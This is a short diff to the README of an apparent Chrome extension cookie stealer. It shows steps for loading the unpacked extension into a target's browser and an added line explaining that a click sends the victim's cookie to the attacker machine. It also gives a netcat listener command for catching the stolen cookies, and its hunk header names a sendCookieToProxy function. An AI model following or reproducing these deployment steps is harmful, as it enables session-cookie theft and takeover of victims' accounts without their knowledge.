@@ -46,6 +46,7 @@ function sendCookieToProxy(cookie) {
 Open Chrome or Chromium and head to "chrome://extensions/" and turn on developer mode.  
 Once developer mode is enabled click "load unpacked" and set the folder to the "Cookie_Stealer_Chrome_Extension" folder.  
 This will install the chrome extention to the target.  
+When the user clicks on the extention, it will be treated as user interaction and the cookie will be sent to the attacker machine.
 
 Catch the cookie requests by using netcat from the attacker computer:  
 ```nc -lvnp $PORT```
